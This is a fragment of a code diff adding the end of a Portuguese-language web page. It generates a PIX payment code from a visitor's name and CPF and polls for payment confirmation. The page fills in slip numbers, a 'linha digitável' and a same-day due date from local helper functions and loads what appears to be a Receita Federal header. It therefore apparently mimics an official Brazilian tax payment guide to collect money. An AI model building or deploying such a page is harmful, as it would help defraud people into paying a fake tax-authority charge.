+            if (jaCopiou && transactionId) {
+                mostrarPopupVerificando();
+                
+                const status = await verificarStatusUmaVez();
+                
+                if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
+                    mostrarPagamentoConfirmado();
+                } else {
+                    iniciarVerificacaoComPopup();
+                }
+            }
+        }
+
+        let verificacaoPopupInterval = null;
+        
+        function iniciarVerificacaoComPopup() {
+            if (verificacaoPopupInterval) clearInterval(verificacaoPopupInterval);
+            
+            verificacaoPopupInterval = setInterval(async () => {
+                const status = await verificarStatusUmaVez();
+                
+                if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
+                    clearInterval(verificacaoPopupInterval);
+                    mostrarPagamentoConfirmado();
+                }
+            }, 5000);
+        }
+        
+        document.addEventListener('visibilitychange', async () => {
+            if (document.visibilityState === 'visible') {
+                const jaCopiou = localStorage.getItem(STORAGE_KEY) === 'true';
+                
+                if (jaCopiou && transactionId && !pagamentoConfirmado) {
+                    mostrarPopupVerificando();
+                    
+                    const status = await verificarStatusUmaVez();
+                    
+                    if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
+                        mostrarPagamentoConfirmado();
+                    } else {
+                        iniciarVerificacaoComPopup();
+                    }
+                }
+            }
+        });
+
+        async function gerarPix() {
+            try {
+                document.getElementById('pix-code').textContent = 'Gerando código PIX...';
+
+                const response = await fetch('/api/pix/create', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        nome: nome,
+                        cpf: cpfLimpo,
+                        level: level,
+                        valor: valor,
+                    }),
+                });
+
+                const result = await response.json();
+
+                if (result.success && result.pix_code) {
+                    transactionId = result.transaction_id;
+                    pixCode = result.pix_code;
+                    STORAGE_KEY = 'pix_copiado_' + transactionId;
+                    PAID_KEY = 'pix_paid_' + transactionId;
+                    exibirPix(pixCode, result.qr_code_base64 || '', result.qr_code_url || '');
+                } else {
+                    document.getElementById('pix-code').textContent = 'Erro ao gerar PIX. Tente novamente.';
+                    console.error('Erro PIX:', result.error || 'Resposta inválida');
+                }
+            } catch (error) {
+                document.getElementById('pix-code').textContent = 'Erro de conexão. Tente novamente.';
+                console.error('Erro ao gerar PIX:', error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', async function() {
+            const dataHoje = getDataHoje();
+            
+            document.getElementById('cpf-pagador').textContent = formatCPF(cpf);
+            document.getElementById('data-documento').textContent = dataHoje;
+            document.getElementById('data-processamento').textContent = dataHoje;
+            document.getElementById('numero-documento').textContent = getNumeroDocumento();
+            document.getElementById('nosso-numero').textContent = getNossoNumero();
+            document.getElementById('guia-numero').textContent = getGuiaNumero();
+            document.getElementById('data-vencimento').textContent = dataHoje;
+            document.getElementById('data-vencimento-2').textContent = dataHoje;
+            document.getElementById('linha-digitavel').textContent = getLinhaDigitavel();
+
+            await gerarPix();
+
+            setTimeout(function() {
+                if (!pagamentoConfirmado) {
+                    document.getElementById('confirmar-section').style.display = 'block';
+                }
+            }, 40000);
+        });
+    </script>
+    <script src="/static/rfb-header.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            rfbHeaderInit('Entrar');
+        });
+    </script>
+</body>
+</html>
